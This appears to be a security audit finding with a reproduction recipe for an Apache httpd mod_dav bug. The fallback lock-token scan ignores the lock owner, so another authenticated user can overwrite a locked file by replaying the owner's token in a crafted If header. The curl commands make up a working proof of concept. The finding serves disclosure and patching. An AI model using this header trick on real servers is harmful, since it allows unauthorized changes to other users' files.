# 028 — WebDAV fallback token scan ignores lock owner

`dav_find_submitted_locktoken()` at `modules/dav/main/util.c:883` accepts a
matching lock token without checking `lock->auth_user`. A different
authenticated user can satisfy locked-resource validation by replaying the
lock owner's token in a non-applicable tagged `If` list.

## Setup

Build httpd with `mod_dav`, `mod_dav_fs`, `mod_auth_basic`, and
`mod_authn_file`:

```bash
./configure --prefix=$PWD/inst \
    --enable-dav --enable-dav-fs \
    --enable-auth-basic --enable-authn-file
make -j && make install
```

Create two users:

```bash
./inst/bin/htpasswd -bcB /etc/httpd/users alice alicepw
./inst/bin/htpasswd -bB  /etc/httpd/users bob   bobpw
mkdir -p /var/dav /var/dav-lock
chown www-data:www-data /var/dav /var/dav-lock
echo alice-original > /var/dav/locked.txt
chown www-data:www-data /var/dav/locked.txt
```

`httpd.conf` snippet:

```apache
LoadModule dav_module        modules/mod_dav.so
LoadModule dav_fs_module     modules/mod_dav_fs.so
LoadModule auth_basic_module modules/mod_auth_basic.so
LoadModule authn_file_module modules/mod_authn_file.so
LoadModule authz_user_module modules/mod_authz_user.so

DavLockDB /var/dav-lock/lockdb

<Directory "/var/dav">
    Dav On
    AuthType Basic
    AuthName "dav"
    AuthUserFile /etc/httpd/users
    Require valid-user
</Directory>
Alias /dav/ /var/dav/
```

## Trigger

Step 1 — Alice locks `/dav/locked.txt`:

```bash
TOKEN=$(curl -sD- -u alice:alicepw \
  -X LOCK http://127.0.0.1:8080/dav/locked.txt \
  -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?>
<D:lockinfo xmlns:D="DAV:">
  <D:lockscope><D:exclusive/></D:lockscope>
  <D:locktype><D:write/></D:locktype>
  <D:owner><D:href>mailto:alice@x</D:href></D:owner>
</D:lockinfo>' \
  | sed -n 's/^Lock-Token: <\(.*\)>.*/\1/p' | tr -d '\r')
echo "alice token=$TOKEN"
```

Step 2 — Bob authenticates and submits Alice's token in a *non-applicable*
tagged list. The applicable list for `/dav/locked.txt` carries only a
harmless `Not` so it succeeds without matching a token; the fallback scan
then finds Alice's token under `/dav/other` and accepts it without checking
ownership:

```bash
ZERO_TOKEN='opaquelocktoken:00000000-0000-0000-0000-000000000000'

curl -v -u bob:bobpw \
  -X PUT http://127.0.0.1:8080/dav/locked.txt \
  --data 'overwritten by bob' \
  -H "If: <http://127.0.0.1:8080/dav/locked.txt> (Not <$ZERO_TOKEN>) \
<http://127.0.0.1:8080/dav/other> (<$TOKEN>)"
```

## Observed effect

Unpatched: response is `204 No Content`, `cat /var/dav/locked.txt` shows
`overwritten by bob`. Bob has modified Alice's locked file. The same lock
remains held by Alice afterwards.

Patched: response is `423 Locked` (or `403 Forbidden` from
`dav_validate_resource_state`'s owner check), file is unchanged.

## Notes

The bypass relies on the fallback scan path — it requires the applicable
tagged list to validate without `seen_locktoken=1`, which the harmless `Not
<zero-token>` clause achieves. Pair with finding 027 for the
unauthenticated-lock variant.
